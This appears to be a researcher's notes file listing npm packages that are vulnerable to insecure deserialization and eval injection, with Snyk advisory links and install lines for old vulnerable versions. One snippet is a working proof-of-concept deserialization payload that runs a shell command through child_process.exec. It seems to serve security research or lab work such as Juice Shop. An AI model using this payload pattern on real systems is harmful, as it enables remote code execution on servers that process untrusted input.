
To see all versions of a package:

`npm view <package-name>`


### Serialize js 

https://snyk.io/vuln/npm:serialize-to-js:20170208
`npm i serialize-to-js@0.8`

```JavaScript
var serialize = require('serialize-to-js');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.deserialize(payload);
```


### Node Serialize

https://snyk.io/test/npm/node-serialize/0.0.4

`npm install node-serialize`


### Serialize JavaScript

https://snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-570062

`npm i serialize-javascript@3.0`


### Safe(r) Eval

https://snyk.io/vuln/SNYK-JS-SAFEREVAL-473029
https://snyk.io/vuln/SNYK-JS-SAFEREVAL-534901

https://www.npmjs.com/advisories/1021

https://snyk.io/vuln/npm:safe-eval:20170830


### Static Eval

`npm i static-eval` (<2.0.0)

https://snyk.io/vuln/npm:static-eval:20171016
https://maustin.net/articles/2017-10/static_eval

https://snyk.io/vuln/SNYK-JS-STATICEVAL-173693


### 

### Other Notes

(For Nikos: https://github.com/bkimminich/juice-shop/issues/269)
